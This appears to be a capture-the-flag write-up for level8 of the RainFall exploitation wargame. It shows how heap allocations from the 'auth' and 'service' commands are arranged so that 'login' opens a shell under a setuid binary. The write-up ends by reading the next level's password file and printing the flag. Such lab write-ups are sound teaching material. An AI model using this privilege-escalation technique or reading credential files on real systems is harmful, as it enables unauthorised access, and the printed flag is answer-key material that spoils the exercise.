level8 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
```

level8 rights:
```Shell
level8@RainFall:~$ ls -la level8 
-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
```

Decompiling with Hex-Rays on https://dogbolt.org/ shows four things:
- `fgets` takes keywords that have different purposes
- `auth` initialises an `auth` variable with a `malloc()`
- `service` initiliases a `service` variable with `strdup()`
- the keyword `login` opens a shell if auth[32] is different from 0

The goal is therefore to modify the value at auth[32] to access the shell. 32 is auth + 8, casted as a DWORD (4bytes).
When you launch the program, it prints our `auth` and `service` variables address.
```Shell
level8@RainFall:~$ ./level8
(nil), (nil)
```

Initialising them with random values allow us to see that they are next to each other on the heap.
```Shell
level8@RainFall:~$ ./level8
(nil), (nil) 
auth coucou
0x804a008, (nil) 
service 1
0x804a008, 0x804a018 
```
Doing the address of `service 1`(0x804a018) - `auth coucou`(0x804a008) = 16, which means that if we add another `service`, we reach 32 and can finally call `login` to get the password.

```Shell
service 2
0x804a008, 0x804a028
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```